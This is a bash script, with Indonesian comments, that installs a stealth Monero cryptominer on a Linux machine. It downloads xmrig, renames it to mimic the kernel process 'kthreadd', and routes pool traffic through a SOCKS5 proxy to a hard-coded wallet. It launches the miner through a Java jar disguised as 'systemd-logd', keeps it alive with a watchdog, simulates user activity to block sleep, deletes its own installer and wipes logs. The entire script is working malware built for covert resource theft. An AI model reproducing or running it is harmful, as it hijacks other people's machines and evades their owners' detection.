#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
POOL="24.199.99.228:1935"
SOCKS5_IP="116.100.220.220"
SOCKS5_PORT="1080"
WORKER="kthreadd-$(hostname 2>/dev/null || date +%s)"
DIR="$HOME/.cache/.kthreadd"

mkdir -p "$DIR" && cd "$DIR"
sync || true

# === DOWNLOAD XMRIG STEALTH ===
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -sLo xmrig.tar.gz "$XMRIG_URL"
tar -xzf xmrig.tar.gz --strip-components=1
rm -f xmrig.tar.gz
mv xmrig kthreadd
chmod +x kthreadd

# === PROXYCHAINS ===
curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
chmod +x proxychains libproxychains.so.4

# === PROXY CONFIG ===
cat > proxychains.conf <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 $SOCKS5_IP $SOCKS5_PORT
EOF

# === XMRIG CONFIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": { "enabled": true },
  "pools": [{
    "url": "$POOL",
    "user": "$WALLET.$WORKER",
    "pass": "Danis",
    "keepalive": true,
    "tls": true
  }]
}
EOF

# === JAVA LAUNCHER ===
cat > Launcher.java <<EOF
import java.io.*; import java.util.*;
public class Launcher {
  public static void main(String[] args) {
    while (true) {
      try {
        Thread.sleep(new Random().nextInt(10) * 1000 + 5000);
        ProcessBuilder pb = new ProcessBuilder("bash", "-c",
          "LD_PRELOAD=" + System.getenv("PWD") + "/libproxychains.so.4 PROXYCHAINS_CONF_FILE=" +
          System.getenv("PWD") + "/proxychains.conf ./kthreadd --config=config.json");
        pb.redirectOutput(new File("/dev/null"));
        pb.redirectErrorStream(true);
        pb.start().waitFor();
        Thread.sleep(3000);
      } catch (Exception e) {}
    }
  }
}
EOF

javac Launcher.java
jar cfe systemd-logd.jar Launcher Launcher.class

# === JALANKAN STEALTH MINER ===
nohup java -Djna.nosys=true -Djava.awt.headless=true -jar systemd-logd.jar >/dev/null 2>&1 &
disown

# === WATCHDOG ===
cat > watchdog.sh <<EOF
#!/bin/bash
while true; do
  if ! pgrep -f systemd-logd.jar >/dev/null; then
    sync || true
    nohup java -jar systemd-logd.jar >/dev/null 2>&1 &
    disown
  fi
  sleep 60
done
EOF

chmod +x watchdog.sh
nohup bash watchdog.sh >/dev/null 2>&1 &
disown

# === ANTI SUSPEND KUAT (hybrid) ===
cat > antisuspend.sh <<EOF
#!/bin/bash
while true; do
  gdbus call --session --dest org.freedesktop.ScreenSaver \\
    --object-path /org/freedesktop/ScreenSaver \\
    --method org.freedesktop.ScreenSaver.SimulateUserActivity >/dev/null 2>&1 || true

  xset s reset >/dev/null 2>&1 || true

  if [ -e /dev/uinput ]; then
    echo "Simulating input" > /dev/uinput 2>/dev/null || true
  fi

  systemd-inhibit --what=idle:sleep --who="miner" --why="prevent sleep" sleep 0.5 || true

  sleep 30
done
EOF

chmod +x antisuspend.sh
nohup bash antisuspend.sh >/dev/null 2>&1 &
disown

# === AUTO HAPUS INSTALLER ===
(
  sleep 10
  rm -f install.sh Launcher.java xmrig.tar.gz proxychains.conf
  rm -f antisuspend.sh watchdog.sh config.json
  echo "[✓] Installer dan konfigurasi dibersihkan otomatis."
) &

# === AUTO BERSIHKAN LOG MINING ===
(
  while true; do
    rm -f "$HOME"/nohup.out "$DIR"/*.log 2>/dev/null
    sleep 60
  done
) &

echo "[✓] Stealth miner aktif dengan watchdog dan anti suspend kuat."
